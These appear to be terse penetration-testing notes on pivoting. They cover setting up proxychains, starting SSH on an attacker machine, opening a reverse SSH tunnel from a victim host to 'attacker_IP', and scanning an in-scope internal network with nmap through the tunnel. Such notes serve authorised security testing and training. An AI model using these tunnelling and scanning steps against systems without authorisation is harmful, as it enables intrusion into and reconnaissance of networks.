Comment strictchain and uncomment dynamicchain. Uncomment quitemode. Comment proxydns. Then change the default config at the bottom from socks4 127.0.0.1 9080 to socks5 and whatever port you want to use.

Note: For RDP, make sure xclip is installed.

On Attacker Box
Open /etc/proxychains4.conf.

!!! SKIP NEXT STEP IF YOU CONFIGURED PROXY CHAINS ALREADY !!!
(ATTACKER) sudo nano /etc/proxychains4.conf

(ATTACKER) netstat -napt (set up listener over ssh)

(ATTACKER) sudo systemctl status ssh.service

(ATTACKER) sudo systemctl start ssh.service (check if started)

configure Port Fowarding rule pn pfsense

(VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port * (this command wont show you anything go back to kali and run net stat, port shoud be open now) 
(refrence wiki for screenshots)

(since the proxy is now available to us we will wrap nmap inside proxychains)
sudo proxychains nmap -iL scope -F -sT -Pn | tee fast_scan
(we are listening over ssh we are not manipulating the port we are manipulating the port fowarding rule)
